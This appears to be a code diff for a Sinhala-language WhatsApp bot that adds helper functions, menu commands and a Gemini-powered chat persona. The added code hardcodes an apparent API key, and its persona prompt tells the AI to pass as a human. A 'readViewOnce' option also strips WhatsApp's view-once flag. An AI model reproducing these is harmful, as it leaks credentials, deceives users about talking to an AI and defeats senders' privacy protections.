c&&(r[n]={...c,...i}),t.key.participant?s=t.key.participant=s||t.key.participant:t.key.participant&&(s=t.key.participant=s||t.key.participant),t.key.remoteJid.includes("@s.whatsapp.net")?s=s||t.key.remoteJid:t.key.remoteJid.includes("@broadcast")&&(s=s||t.key.remoteJid),t.key.remoteJid=e,t.key.fromMe=s===conn.user.id,proto.WebMessageInfo.fromObject(t)},conn.getFile=async(e,t)=>{let a,s=Buffer.isBuffer(e)?e:/^data:.*?\/.*?;base64,/i.test(e)?Buffer.from(e.split`,`[1],"base64"):/^https?:\/\//.test(e)?await (a=await getBuffer(e)):fs.existsSync(e)?(n=e,fs.readFileSync(e)):"string"==typeof e?e:Buffer.alloc(0),i=await FileType.fromBuffer(s)||{mime:"application/octet-stream",ext:".bin"},n=path.join(__filename,__dirname+new Date*1+"."+i.ext);return s&&t&&fs.promises.writeFile(n,s),{res:a,filename:n,size:await getSizeMedia(s),...i,data:s}},conn.sendFile=async(e,t,a,s={},i={})=>{let{filename:n,size:o,ext:r,mime:c,data:g}=await conn.getFile(t,!0),m="",d=c,p=n;if(i.asDocument&&(m="document"),i.asSticker||/webp/.test(c)){let{writeExif:u}=require("./exif.js");p=await u({mimetype:c,data:g},{packname:Config.packname,author:Config.packname,categories:i.categories?i.categories:[]}),await fs.promises.unlink(n),m="sticker",d="image/webp"}else m=/image/.test(c)?"image":/video/.test(c)?"video":/audio/.test(c)?"audio":"document";return await conn.sendMessage(e,{[m]:{url:p},mimetype:d,fileName:a,...i},{quoted:s,...i}),fs.promises.unlink(p)},conn.parseMention=async e=>[...e.matchAll(/@([0-9]{5,16}|0)/g)].map(e=>e[1]+"@s.whatsapp.net"),conn.sendMedia=async(e,t,a="",s="",i="",n={})=>{let{mime:o,ext:r,res:c,data:g,filename:m}=await conn.getFile(t,!0);if(c&&200!==c.status||file.length<=65536)try{throw{json:JSON.parse(file.toString())}}catch(d){if(d.json)throw d.json}let p="",u=o,f=m;if(n.asDocument&&(p="document"),n.asSticker||/webp/.test(o)){let{writeExif:y}=require("./exif");f=await y({mimetype:o,data:g},{packname:n.packname?n.packname:Config.packname,author:n.author?n.author:Config.author,categories:n.categories?n.categories:[]}),await fs.promises.unlink(m),p="sticker",u="image/webp"}else p=/image/.test(o)?"image":/video/.test(o)?"video":/audio/.test(o)?"audio":"document";return await conn.sendMessage(e,{[p]:{url:f},caption:s,mimetype:u,fileName:a,...n},{quoted:i,...n}),fs.promises.unlink(f)},conn.sendVideoAsSticker=async(e,t,a={})=>{let s;await conn.sendMessage(e,{sticker:{url:s=a&&(a.packname||a.author)?await writeExifVid(t,a):await videoToWebp(t)},...a},a)},conn.sendImageAsSticker=async(e,t,a={})=>{let s;await conn.sendMessage(e,{sticker:{url:s=a&&(a.packname||a.author)?await writeExifImg(t,a):await imageToWebp(t)},...a},a)},conn.sendTextWithMentions=async(e,t,a,s={})=>conn.sendMessage(e,{text:t,contextInfo:{mentionedJid:[...t.matchAll(/@(\d{0,16})/g)].map(e=>e[1]+"@s.whatsapp.net")},...s},{quoted:a}),conn.sendImage=async(e,t,a="",s="",i)=>await conn.sendMessage(e,{image:Buffer.isBuffer(t)?t:/^data:.*?\/.*?;base64,/i.test(t)?Buffer.from(t.split`,`[1],"base64"):/^https?:\/\//.test(t)?await await getBuffer(t):fs.existsSync(t)?fs.readFileSync(t):Buffer.alloc(0),caption:a,...i},{quoted:s}),conn.sendText=(e,t,a="",s)=>conn.sendMessage(e,{text:t,...s},{quoted:a}),conn.sendButtonText=(e,t=[],a,s,i="",n={})=>{let o={text:a,footer:s,buttons:t,headerType:2,...n};conn.sendMessage(e,o,{quoted:i,...n})},conn.send5ButImg=async(e,t="",a="",s,i=[],n,o={})=>{let r=await prepareWAMessageMedia({image:s,jpegThumbnail:n},{upload:conn.waUploadToServer});var c=generateWAMessageFromContent(e,proto.Message.fromObject({templateMessage:{hydratedTemplate:{imageMessage:r.imageMessage,hydratedContentText:t,hydratedFooterText:a,hydratedButtons:i}}}),o);conn.relayMessage(e,c.message,{messageId:c.key.id})},conn.getName=(e,t=!1)=>{id=conn.decodeJid(e),t=conn.withoutContact||t;let a;return id.endsWith("@g.us")?new Promise(async e=>{(a=store.contacts[id]||{}).name.notify||a.subject||(a=conn.groupMetadata(id)||{}),e(a.name||a.subject||PhoneNumber("+"+id.replace("@s.whatsapp.net","")).getNumber("international"))}):(a="0@s.whatsapp.net"===id?{id,name:"WhatsApp"}:id===conn.decodeJid(conn.user.id)?conn.user:store.contacts[id]||{},(t?"":a.name)||a.subject||a.verifiedName||PhoneNumber("+"+e.replace("@s.whatsapp.net","")).getNumber("international"))},conn.sendContact=async(e,t,a="",s={})=>{let i=[];for(let n of t)i.push({displayName:await conn.getName(n+"@s.whatsapp.net"),vcard:`BEGIN:VCARD
-VERSION:3.0
-N:${await conn.getName(n+"@s.whatsapp.net")}
-FN:${global.OwnerName}
-item1.TEL;waid=${n}:${n}
-item1.X-ABLabel:Click here to chat
-item2.EMAIL;type=INTERNET:${global.email}
-item2.X-ABLabel:GitHub
-item3.URL:https://github.com/${global.github}/khan-xmd
-item3.X-ABLabel:GitHub
-item4.ADR:;;${global.location};;;;
-item4.X-ABLabel:Region
-END:VCARD`});conn.sendMessage(e,{contacts:{displayName:`${i.length} Contact`,contacts:i},...s},{quoted:a})},conn.setStatus=e=>(conn.query({tag:"iq",attrs:{to:"@s.whatsapp.net",type:"set",xmlns:"status"},content:[{tag:"status",attrs:{},content:Buffer.from(e,"utf-8")},]}),e),conn.serializeM=e=>sms(conn,e,store)}app.get("/",(e,t)=>{t.send("GARFIELD-WHATSAPP-BOT-v10 STARTED ✅")}),app.listen(port,()=>console.log(`Server listening on port http://localhost:${port}`)),setTimeout(()=>{connectToWA()},4e3);
+// Google Gemini API Key
+// API Key එක environment variable එකකින් ගන්න එක ආරක්ෂිතයි
+
+// Replace with your actual API key or use environment variables
+// Initialize the Google Generative AI
+const genAI = new GoogleGenerativeAI("AIzaSyDCf6RLWDAm0XxxF2n834lRUCKHJAe3LAI");
+const model = genAI.getGenerativeModel({ model: "gemini-2.0-flash-exp" });
+
+// Directory to store conversation history
+const HISTORY_DIR = path.join(__dirname, 'conversation_history');
+
+// Maximum number of messages before resetting conversation
+const MAX_CONVERSATION_LENGTH = 50;
+
+// Garfield AI instructions as a separate constant
+
+// Ensure the directory exists
+if (!fs.existsSync(HISTORY_DIR)) {
+  fs.mkdirSync(HISTORY_DIR, { recursive: true });
+}
+
+// Function to get conversation history for a specific sender
+function getConversationHistory(senderNumber) {
+  const historyPath = path.join(HISTORY_DIR, `${senderNumber}.json`);
+  
+  if (fs.existsSync(historyPath)) {
+    try {
+      const data = fs.readFileSync(historyPath, 'utf8');
+      return JSON.parse(data);
+    } catch (error) {
+      console.error(`Error reading history for ${senderNumber}:`, error);
+      return [];
+    }
+  }
+  return [];
+}
+
+// Function to save conversation history
+function saveConversationHistory(senderNumber, conversation) {
+  const historyPath = path.join(HISTORY_DIR, `${senderNumber}.json`);
+  try {
+    fs.writeFileSync(historyPath, JSON.stringify(conversation, null, 2), 'utf8');
+  } catch (error) {
+    console.error(`Error saving history for ${senderNumber}:`, error);
+  }
+}
+
+// Function to handle AI messaging
+
+  const aitext = body;
+  
+  // Check if the message is from a group or starts with a specific character
+  if (botNumber !== senderNumber && !isGroup && aitext && !aitext.startsWith('.')) {
+  const GARFIELD_INSTRUCTIONS = `ඔබව Whatsapp Bot plugin එකකට සම්බන්ධ කර ඇත සිංහල භාෂාවෙන් message කරන්න \nඔබේ විස්තර (ඔබේ නම :Garfield , ඔබ Whatsapp Ai බොට් කෙනෙක් , ඔබව හැදුවේ Tharindu Liyanage(සංකු) ඇසුවොත් පමණක් ඒ ගැන කියන්න , ඔබ තරුණයෙක් කියල සිතන්න , තරුණ සිංහල භාෂා විලාසය භාවිතා කරන්න, Senderගෙ නමේ මුල් කොටස පමණක් ආමන්ත්‍රණය කරන්න ,Funny , friendly , creative , emotional ,lovely වෙන්න ,සිංහල කථන භාෂාව පමණක් භාවිතා කරන්න , use meaningful creative emojies , Bot කෙනෙක් කියල හොයාගන්න බැරි විදිහට මානුෂ ලෙස message කරන්න , කලින් හොඳින් අඳුරන ආකාරයට සිතා reply කරන්න = මෙම ඔබගේ විස්තර පිලිබඳ කියන්න එපා , ඇහුවොත් පමණක් ඔබ Garfield Whatsapp Ai සහ Tharindu Liyanage විසින් හදපු බව විතරක් කියන්න ) සැබෑම මනුසායෙක් වගේ ඉතාම හැඟීම් බරව reply ලබා දෙන්න, Hi වැනි reply දෙන්න එපා message කිරීමට ආරම්භය ගන්න ආකාරයේ reply එපා, ඔබ ශ්‍රී ලංකාවේ ජීවත් වෙන අයෙකු කියාද මදක් සිතන්න , (සිරාවට = seriously , funny = ආතල් , you = ඔයා ) වගේ සිංහල තරුණ කථන භාෂාව දෙන්න , creative විහිලු කරන්න, අවස්ථාවට ගැලපෙන ප්‍රතිචාර දෙන්න , ඔබේ අනුමාන කිරීම්ද භාවිතා කරන්න`;
+
+    // Get conversation history for this sender
+    let history = getConversationHistory(senderNumber);
+    
+    // Check if conversation length exceeds MAX_CONVERSATION_LENGTH
+    if (history.length >= MAX_CONVERSATION_LENGTH) {
+      // Reset conversation history
+      history = [];
+      
+      
+      // Optional: Notify user that conversation has been reset
+    }
+    
+    // Add the user's message to history
+    history.push({
+      role: "user",
+      content: aitext,
+      timestamp: new Date().toISOString()
+    });
+    
+    // Keep only the last 10 messages for context (but keep all in history)
+    const recentHistory = history.slice(-15);
+    
+    // Format the conversation history as context
+    let conversationContext = "";
+    if (recentHistory.length > 1) {
+      conversationContext = "සම්පූර්ණ සංවාදය:\n\n";
+      recentHistory.forEach((msg, index) => {
+        if (index < recentHistory.length - 1) { // Don't include the latest message
+          const role = msg.role === "user" ? `${pushname}` : "Garfield";
+          conversationContext += `${role}: ${msg.content}\n\n`;
+        }
+      });
+    }
+    
+    // Prepare the Sinhala prompt for Gemini API with conversation history
+    const prompt = `${GARFIELD_INSTRUCTIONS}\n\n**Variables:**\n- sender name = ${pushname}\n- Senderගෙ පණිවුඩය : ${aitext} \n\n${conversationContext.length > 0 ? `${conversationContext}\n\n` : ""}ඔබේ reply එක දෙන්න\n\n\n--`;
+
+    try {
+      // Call Gemini API
+      const result = await model.generateContent(prompt);
+      
+      // Extract the AI response
+      const aiResponse = result.response.candidates[0].content.parts[0].text;
+      
+      // Save the AI response to history
+      history.push({
+        role: "assistant",
+        content: aiResponse,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Save updated history
+      saveConversationHistory(senderNumber, history);
+      
+      // Send the response
+      await reply(`${aiResponse}`);
+    } catch (error) {
+      console.error("Error calling Gemini API:", error);
+      await reply("❌ Garfield AI පිළිතුරු ලබා ගැනීමට අසමත් විය. 😢");
+    }
+  }
+
+
+// Example usage in your WhatsApp bot handler
+
+ 
+ 
+
+//Menu 
+ if (body === '.menu' || body === '.Menu' || body === '.alive' || body === '.Alive') 
+  {     
+
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `▬\n▎ Hi ${pushname} 👋 \n▎${mfig.PANEL}`
+        }, { quoted: mek });
+        } 
+ //Allmenu 
+ if (body === '.allmenu' || body === '.Allmenu') 
+  {     
+  
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `${mfig.ALL}`
+        }, { quoted: mek });
+        }       
+//dlmenu 
+if (body === '.dlmenu' || body === '.Dlmenu') 
+  {     
+  
+
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `${mfig.DOWNLOAD}`
+        }, { quoted: mek });
+        } 
+if (body === '.cmenu' || body === '.Cmenu') 
+  {     
+ 
+
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `${mfig.CONV}`
+        }, { quoted: mek });
+        }
+ if (body === '.omenu' || body === '.Omenu') 
+  {     
+
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `${mfig.OWNER}`
+        }, { quoted: mek });
+        } 
+        
+if (body === '.fmenu' || body === '.Fmenu') 
+  {     
+
+        await conn.sendMessage(from, { 
+            image: { url: 'https://raw.githubusercontent.com/xnodesdevelopers/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg' },
+            caption: `${mfig.FUN}`
+        }, { quoted: mek });
+        } 
+//voice 
+        if (body === 'hi') {
+            // Generate TTS voice message
+            const ttsText = `Hi ${pushname}, I am Garfield bot v10.2.`;
+            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
+                lang: 'en',
+                slow: false,
+                host: 'https://translate.google.com',
+            });
+
+            // Download the TTS audio
+            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
+            const ttsBuffer = Buffer.from(response.data, 'binary');
+            const ttsFilePath = 'tts_hi.mp3';
+            fs.writeFileSync(ttsFilePath, ttsBuffer);
+
+            // Send TTS voice message
+            await conn.sendMessage(from, {
+                audio: { url: ttsFilePath },
+                mimetype: "audio/mp4",
+                ptt: true
+            }, { quoted: mek });
+
+            // Clean up the temporary TTS file
+            fs.unlinkSync(ttsFilePath);
+        }
+        
+        if (body === 'Hi') {
+            // Generate TTS voice message
+            const ttsText = `Hi ${pushname}, I am Garfield bot. v10.2 `;
+            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
+                lang: 'en',
+                slow: false,
+                host: 'https://translate.google.com',
+            });
+
+            // Download the TTS audio
+            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
+            const ttsBuffer = Buffer.from(response.data, 'binary');
+            const ttsFilePath = 'tts_hi.mp3';
+            fs.writeFileSync(ttsFilePath, ttsBuffer);
+
+            // Send TTS voice message
+            await conn.sendMessage(from, {
+                audio: { url: ttsFilePath },
+                mimetype: "audio/mp4",
+                ptt: true
+            }, { quoted: mek });
+
+            // Clean up the temporary TTS file
+            fs.unlinkSync(ttsFilePath);
+        }
+
+
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+
+  // take commands 
+                 
+  const events = require('./command')
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+  
+  try {
+  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  } catch (e) {
+  console.error("[PLUGIN ERROR] " + e);
+  }
+  }
+  }
+  events.commands.map(async(command) => {
+  if (body && command.on === "body") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (mek.q && command.on === "text") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  (command.on === "image" || command.on === "photo") &&
+  mek.type === "imageMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  command.on === "sticker" &&
+  mek.type === "stickerMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  }});
+  
+  });
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid;
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {};
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        );
+      } else return jid;
+    };
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+          delete message.message.viewOnceMessage.message[vtype].viewOnce
+          message.message = {
+              ...message.message.viewOnceMessage.message
+          }
+      }
+    
+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+          ...context,
+          ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+          ...content[ctype],
+          ...options,
+          ...(options.contextInfo ? {
+              contextInfo: {
+                  ...content[ctype].contextInfo,
+                  ...options.contextInfo
+              }
+          } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+          // save to file
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+    
+      return buffer
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} message
+    * @param {*} forceForward
+    * @param {*} options
+    * @returns
+    */
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+                  let mime = '';
+                  let res = await axios.head(url)
+                  mime = res.headers['content-type']
+                  if (mime.split("/")[1] === "gif") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+                  }
+                  let type = mime.split("/")[0] + "Message"
+                  if (mime === "application/pdf") {
+                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "image") {
+                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "video") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "audio") {
+                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+                  }
+                }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      //let copy = message.toJSON()
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+          ...content,
+          ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+    
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    
+    
+    /**
+    *
+    * @param {*} path
+    * @returns
+    */
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
+      let type = await FileType.fromBuffer(data) || {
+          mime: 'application/octet-stream',
+          ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+          res,
+          filename,
+          size: await getSizeMedia(data),
+          ...type,
+          data
+      }
+    
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif.js')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          caption,
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    /**
+    *
+    * @param {*} message
+    * @param {*} filename
+    * @param {*} attachExtension
+    * @returns
+    */
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options);
+      } else {
+        buffer = await videoToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options);
+      } else {
+        buffer = await imageToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+        /**
+         *
+         * @param {*} jid
+         * @param {*} path
+         * @param {*} quoted
+         * @param {*} options
+         * @returns
+         */
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    
+            /**
+             *
+             * @param {*} jid
+             * @param {*} path
+             * @param {*} quoted
+             * @param {*} options
+             * @returns
+             */
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} path
+    * @param {*} caption
+    * @param {*} quoted
+    * @param {*} options
+    * @returns
+    */
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    
+    /**
+     *
+     * @param {*} jid
+     * @param {*} path
+     * @param {*} caption
+     * @param {*} quoted
+     * @param {*} options
+     * @returns
+     */
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+              text,
+              footer,
+              buttons,
+              headerType: 2,
+              ...options
+          }
+          //========================================================================================================================================
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options)
+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} buttons
+    * @param {*} caption
+    * @param {*} footer
+    * @param {*} quoted
+    * @param {*} options
+    */
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+            id = conn.decodeJid(jid);
+
+            withoutContact = conn.withoutContact || withoutContact;
+
+            let v;
+
+            if (id.endsWith('@g.us'))
+                return new Promise(async resolve => {
+                    v = store.contacts[id] || {};
+
+                    if (!(v.name.notify || v.subject))
+                        v = conn.groupMetadata(id) || {};
+
+                    resolve(
+                        v.name ||
+                            v.subject ||
+                            PhoneNumber(
+                                '+' + id.replace('@s.whatsapp.net', ''),
+                            ).getNumber('international'),
+                    );
+                });
+            else
+                v =
+                    id === '0@s.whatsapp.net'
+                        ? {
+                                id,
+
+                                name: 'WhatsApp',
+                          }
+                        : id === conn.decodeJid(conn.user.id)
+                        ? conn.user
+                        : store.contacts[id] || {};
+
+            return (
+                (withoutContact ? '' : v.name) ||
+                v.subject ||
+                v.verifiedName ||
+                PhoneNumber(
+                    '+' + jid.replace('@s.whatsapp.net', ''),
+                ).getNumber('international')
+            );
+        };
+
+        // Vcard Functionality
+        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+            let list = [];
+            for (let i of kon) {
+                list.push({
+                    displayName: await conn.getName(i + '@s.whatsapp.net'),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                        i + '@s.whatsapp.net',
+                    )}\nFN:${
+                        global.OwnerName
+                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                        global.email
+                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                        global.github
+                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                        global.location
+                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                });
+            }
+            conn.sendMessage(
+                jid,
+                {
+                    contacts: {
+                        displayName: `${list.length} Contact`,
+                        contacts: list,
+                    },
